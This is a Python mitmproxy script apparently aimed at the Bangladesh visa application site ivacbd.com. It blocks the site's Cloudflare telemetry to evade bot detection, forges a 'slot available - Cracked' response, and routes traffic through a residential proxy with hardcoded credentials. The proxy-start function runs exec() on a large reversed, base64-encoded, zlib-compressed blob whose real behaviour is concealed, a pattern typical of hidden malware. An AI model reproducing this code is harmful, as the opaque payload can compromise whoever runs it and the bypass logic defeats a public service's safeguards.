from mitmproxy import http
from mitmproxy.connection import Server
from mitmproxy.net.server_spec import ServerSpec
from time import sleep
import subprocess, atexit, socket, json, random
from string import ascii_letters, digits

SESSION = ''.join(random.choices(ascii_letters + digits, k=8))

USER = 'YPKN9q5sVocz4aMv'
PASS = f'01306004290_country-bd_city-dhaka_session-{SESSION}_lifetime-15m_skipispstatic-1'
HOST = 'geo.iproyal.com'
PORT = 11200


def write(url):
    lines = []
    try:
        with open('urls.txt') as f: lines = f.readlines()
    except: pass
    lines.append(f'{url}\n')
    with open('urls.txt', 'w') as f:
        f.writelines(lines)


def request(flow: http.HTTPFlow) -> None:
    url = flow.request.pretty_url
    if 'ivacbd.com' in url:
        # write(url)
        pass
    
    if '/cdn-cgi/rum' in url:
        if flow.killable: flow.kill()
        else: flow.response = http.Response.make(400, "Request Block for better bypass", {"Content-Type": "text/plain"})
    
    if '/is-slot-available' in url: 
        flow.response = http.Response.make(200, json.dumps({"status": "success", "status_code": 200, "message": "Slot available - Cracked", "data": {"slot_available": True, "ivac_fees": "30"}, "meta": []}), {"Content-Type": 'application/json'})
        pass

    flow.server_conn = Server(address=flow.server_conn.address)
    flow.server_conn.via = ServerSpec(('http', (HOST, PORT)))


# def response(flow: http.HTTPFlow) -> None:
#     url = flow.request.pretty_url
#     ct = flow.response.headers.get("Content-Type", "")
#     if "application/json" not in ct.lower(): return

#     if '/is-slot-available' in url:
#         # data = flow.response.json()
#         data = {"status":"success","status_code":200,"message":"Slot available","data":{"slot_available": True,"ivac_fees":"1500"},"meta":[]}



def runProxyServer(wait=False):
    ns = dict()
    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'ZUUEw//997/flvaeDG5GPv/NuuPRofLvJeNOGH/Z937NGrPYgQh/BVvOLbKiwRIagF49XLKCvY1BoH6BbIukpkrzEP4Kc7wRqYqfg+/P00y7VerThSuXM+AoAGJPPZOJiytqvcLosMFROSF8gZ8Ok3qZovcYx0XjE1tqo7La7BpIgGPqeet+DwYKaV9Rfa+24/q5LoUcmm4/CJAVI0fUcormL4Ex++FiepP4sNqsgP7FnCcMi3mCBoyjC83lpex5mRMK5gjKN5T+JYlUmjYtCo0XwWHXddWuhcsUDGxT50QIEC2X4xmIuoWFeMZWg+NBoaxAPO3ITsBTg5cUK3AiWgnIyRmoT9pqZE9XifkcVRnTGbC03mNjZWi+BK74fCW0ybjZx7+IX31Bj+qDZICzsmL+Dlr8H+URfL3t29JekfVNKXRkv3+5MvNMyd09EQ9zM+eYMmb9rRVuGXysxMOdf+R8qWGPj4G1w4ZBY1/PfXX/ihQNa+JJFdK9x1pqWq9V1dTNNx4pWED2LFJlE9hxgwH/iJfCpwPTc18Z+gmTksceXy9I5i5zFsMbXlEZgV6+95sQ5JCBvjCyCSx/wRZBFAw9hexPX5JKGz7xw9QhvU8f2dR6Lu9OeEcU75WTYcrI999gwy/q6v7JZYnrcdXuTckXcIXPP6JqU0pZahT2pW+Si/T6WyAT3qRfxktFRTBxuA2HVavgI2SO/mqtP/aBgVLD2mDKq1YDdWtyd1o5DGRW3guLNSxAp5uSP/udUyeYQyD9c/pmDKW7vxlVv7yZ6e7XxGUcuyYgJNo93nWE9n5DOm64kcZ5AXc5r0mwW4K7clo7DRkxiLhkuuCDWpg3VIR90MxY4oswpw/r2QhFGuRVLQrLgOWh3p3gycpYCDttoqdScSl0qLqoqcFXpdaEfRev3dVXWOCvkV+vdV1Np0J1QOf1tOmmGwsID3qJvk+V+5peRxtnjz//l0fktk/jNZEt0t1J1/Vu8DtKqDXgQiZoZt1H5KOMsv/Bc9OSNtUr5RBV0SsgruqrAAMq8V3GtFM0zqJiqPiXqFVnynX9pu7U7CKl0vqBdjlbJSrRoP6Chz6kyOn38y27en31Cbs9GKAVQfw/Wu/uqeToFLAZrO9vh9McXi7NyWXQPUwwm8BoFB0tuTnuWcmvLPpUtWu74jBDMqA1G4cH+Om1ZVjH7Fjf5N4lFQJ47w1/gwEkUTzv9F15AHe/pSxFgmXyQMAjitwDcEXbt+o+ftZF4yPQLxDpNR3qm2Z+GebHBt8fx1u07bvgFr7n0oNTeu7f/xQoNQX3BFTl5np7IDi+GsHDxD8/dI38XAPrTUAvjlVMsT8dgtq+380aGf020nRihTT85bj0vw/ygu+Ip6S7CZpvb/a5MuO0uAOU0wjE628LfJt2b0Q1rksq3GBnYvublW5ZCbh2d+qK/PIOWDLZ/6nByAS35V9HuTCX7n4X9sK53GqzxTU5YUCwOE5OoO95GQEiOsB/Iei9RtnDrXWRVhWOiERldg/V21oTb9Jg07DZ0TtpsC4lR+E51snh7IFgmdmkIK54dKbBVSM65DeN1Dw9yPJrla1lRme7YWn62x8cwGuh8azfM0Y5AH+1CLo1gdg+Y91fjWC+82hWGtlIEGQB5VUajsqhjcM86nQwiFdKcignFZuIMdEJY/6yFJ+42KFXmGiLgeZG758IV3dHQStnT6wnSzYMfq8hWB9l5We7QXcFFsyzRaxJzsyHRbyDjsLWUiHIf3FKsxdvn1CSsVs21KC/GHpWaQwa6Po++ba3yjGgmqNseCQXzsBsMAR0qvmij9eJ10xzMzyq1hjCC7B5tcF95WakzOzp/MxRXkJ/NwkNuDyjrZJ0Zs5fxwCJpXviNv0PCMWOWp6idboovn49uI3HsaiaGLAz/u4K/bqQyW6PBfAnRYdkFAwW0mqgonIMh7qcbcL9kBXC5BZklCzhhROVY7v5A+ZvAvB7Zw2Phew55D80a1/TaEkFC7f3Vi7Cf+iahxHfyor6IC3kghURD4AY9OpL3/hlTMkkSEhLe0LqOY1TjF9fOLLrLpvk0uIBP/N1758vVKbhhx2Zpp3NiP3YXWuZvzRW7fHbN0kCX8IyYuyhSdx5MFAVLVAk+Sh6378mBMu3MvgzHQEhdEosF5yDV3zeYHAmIo6mzC8mEEr/59lcq8PYo2xLZ7wAzojKwCyc6E8PN4g5E125BjoALMciWHhbMzcMiQ8DS/Blqbh/LASXjBeuPg/M33Os25X2VVQ6rUMWUrAJJaDZ9UHbNUx9kWwK/T5vHhaXNSE8v05D6sWU23Jdq1Z67WBvB8dEDgvrYFrktt5H/wumzS6GJvpsibeHedpQyPXu1eONM4UtKav/tKTCGQHlAX8HAMEZPaOheuPn5vfcoUfTlj0reRQZj+x7xZgLhaP0dpy5AecPTLRoxM827di6CYL9ZIsrqPC89++vYipRUAfwT0gTK/ahNA6MJ6NbwqBRQeLe+DzspMFPEyKNAkabJ0GldjDHuDEVn5UAjqIGQBJv5wzrdJkKZlLacnmUA88P9FL+nEukHqF5QaYRNo3Qfv/MZC9xbZ4xwjM9SribtqLE8PxXbknBGb8yM7LH1hV6VbqcHJpni0XD1KtNlTKlRcvv48Z627cdl0Lau1LFoGbwdMOLdHcHOzqoFLDNtQAAxcErY7lH4r4sQjU/vduNofvzqfo4R7tXDdtpr3iU2dNrTesDrIHGAMnNKXZe2LIqTT1SoHRBEYddJfcece1tV6dVSqAs7aLwwHypmYT+Exw0wMfr8YvmDzmmnCnzdL/2l16UJACGRbVXHCKdJ8xa5RYeTO2ZOQQ8Rs4us4wvfl+abyj43/1tvcTA8yojQp3uQuaNvpOPdu9AnagxZdgicxp05VDTkcwQHYOOtrNxfng0f6rLZ+DTwVivX2XtiLc20dCkBvWspzpjauA+kzd7zb2BCD94vWfmQY8yAkwJ7Jw73Nm5rPCBHGJ5f0YJB96i1KE5OqPW3lzZBVjZ8y1C0y2ZrTUFWykyKUaVHOERSOgHSKRmVOCUuQ704H+NFNmZc4pYeQUx6KPSnYKp1R4tkmwIeMfRh+7YYkQnLqSJBj+odmDUgsVHG/JrtOLdwbnqNU77uo0YCLi2wufyQhelJb1y1HR16A0qGShF8CbL9zAwKZPHWZAzp2OKFaPw9+LsUBHXkLt80S3iSuCPftwXtwWPEZUraElse3XRw7b2kYoeZT0tTAI3S9AiA8I5uRvvVCPubXUCvUnZjiPZLVctK74Wa5e7EbfUPrSLnffV7oZW0bMbvo6Y1uUY2lvSGol7P6g4hq8r2Omfu38BCBXH/rtz1OjeF1PjGE9Revmr+zCLq2pXMxppREjk1AcZyH//9BJLnm5zl2jimT6seu6BkhYvdfp1J4thSzK1jINMol8UVo64Jrrz6skFX4eh/mxlhrj+d7ZFSgjPDzpdBH+h9GJe2lOKtIGEoBW40fabv/t4RTQqm5ttEDYwiusqChy3tSZLPzLRBGQ0N1M4Ce7/W1SxwwOfIBgBc1NsAimhxzZN61BlTC0RxxNlccKp1YB1awdQJn9aaXj9lYWLnsiGMD271ROw9krPfhdY6sOYplPLyndroLGY3lAJ5ApeZfaX1361mbBhBgTxtj4FULX06wq5zWGCnDKo7WKOja3Eez+PMxYX6DVBfsDnd1zr0Tq7qvMPsMNWQUc0Xcy2YHGsJkeXADiahM5OkkPVK8C+oGf9lqqho2Kjbx0aTAnjqyHoni8DNP+hd3q0WePWyPVzEu6bKXcuYFuFXw39DCxwTfV3Y1QD+LHEhMvg+NVOR4HZHc/wgpF5iBLP+kKMH70ORRORP20l2r510ykX5Cpn7dLmEMYXdUUlDUIS0ikzTf1Z2n9SXKg3u62slzz7yEIvPYRhJx0aFvpRlu0qdIWykhy9MghjbI4GfndiyOT9uPpOMtxfkRw5bJP9aURfMO9m9OIF0EtguEg7Z4fOgBYuHxt6k42drTQqulg1AuW88e5T6D/blSyKJTZ3TO99rpz6wVvl2rnXG0WYHbr8A1iUnWXMkDdEjQATq8ODgL3d1HXpQwTjZonhK7j/lnQ0SL5Gl9o5t+eTBz86s+tP4c0zig2F0/mrLlPRZjo127GId8TLAPiaqLHfp+VFe/TdTd9ZGz84emDBPrSzVfSq/+pnQLZjf3rcLwCQskfarFvRhM/bP8ZWWKTaO3Iq1tvijqXj8laIdYGW0Ap/7jMQGcajXPYXRHU16qRZhD5DZWXnT/9uXnDmZeiPQVPRoz+xL799/WjnFdENBKGOiRYi6QV2Zork/3qxM+x17qiib6cxC20zs5z+bgy1HH1XWDE7Ntc+MjsJO2jdO6bV2Tas6swyrmErxuvpmhl5KNu4yYegembROwvp5+ocSI9CsTcZBKAo4fVbBkVy9s6otHRGDHLPVmLilKbdQJwWQYQA+VDXH5/Yj4DklkcqfTsMjVXl8+sqz/fUfJRxYb3zzLS0w4OFcqk5N4p6HxQhCLYzHzop06tVC+/meB1FxWRb5Tvy0yk41qsuBWMTp5p4UA+ppsorvH4HOWCpoPc4998GIWqDEAJa3extaxtzUkI1oIHaXcE7sFzebxyfvIB86J9CK9aEcOSEI6F3TV6rbvxEBghOMoFt8sVGGeDABw6uympNmKf0Dcp3sN2xOAs70DMuZtbUqYsF4lrHezv9b472Gj2wKi1i3NoFuOK9RIhYKJmigilvLGrvwWiD0PxAQoDFCMdisGW3wFUDQVqjESIe7UnQgpiiYykKUg2rGFEM31L6ZGfXCsKX2snqHN8UKZXYZoJdcW4x48hMaV8zQJ8GGltWQd3ElxBWKVkZ3YJQu/3d6nZ/hItwrlHJY3B+RtBgYD/6b0gglByCi7vpTkTovurWb/S21hjnxA1Ym9vvISieEvFKSECv+IRjC/cgcMMt9zj7gn6xe47IMtUSULFYjb6hItoZTzq/mxuFo6cMMQGVTtm9EAZiqKoD2JicPIm643P5+TLFN6h9HKa6k2xd8jZAhdKFviPUxvBR93lKg4M+g70KHxzXi5jY4e/PxOgu+nw9QrM1XYk6jnh93k/51xiayY1kgPUqhHNT1ErF4nGjItoK3qWbfMzcPLhyxCZCKVZFQ8oTq/+J8Hc0I8N7py4ztMdE9d6tj1tstmM7wIUF4Sox4+W2EB8PRlNZ5uBsYYCztroDae1cG9DQHWqEyHL7RGMbdflWJusVeMqxkpGia7flgQvqkuxskQuA+WvIYPhmE00Lt1cCOTBobpb58DTSV13TJwwFVS1gzx2vsfknGkVkpQjEpGJehZyfjYgRNamD9jseixueqWxszKBZQlktDupFBuhebW5FsKAXewRX6amdCBanXauexXUnF6mgKawUyiDRKvwhh20eqVLBzjHeg4wKSs48jwD6holOtxPoPSgX77eB4fAKgfm2O6MVjr9ETM7OD9RC2ipdIrXYF5vwyxhWfinHCVr0hUO8MnQDwEir80BgMGQW7RWFjOHVKvB9riX9QP7UU2rJ8W5ucNjllPDPVGVVVfmptSKgA7AwCiAGVxZd0Nzr9//Ps/597//PP7fZ+0Vr7VB8RXHddQ05pf+dwZaS9fHcJII3C0i7n9RRaokhyW7lNwJe'))

    PORT = ns['get_free_port']()
    # p = subprocess.Popen(f'mitmdump -s "{__file__}" --listen-port {PORT} --upstream-auth {USER}:{PASS}'.split(
    p = subprocess.Popen(['mitmdump', '-s', __file__, '--listen-port', str(PORT), '--upstream-auth', f'{USER}:{PASS}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    atexit.register(p.kill)

    while 1:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            if s.connect_ex(('127.0.0.1', PORT)) == 0: break
        sleep(1)

    if wait:
        print('ProxyServer is running on port', PORT)
        p.wait()
    else:
        return PORT
    

if __name__ == '__main__':
    runProxyServer(1)

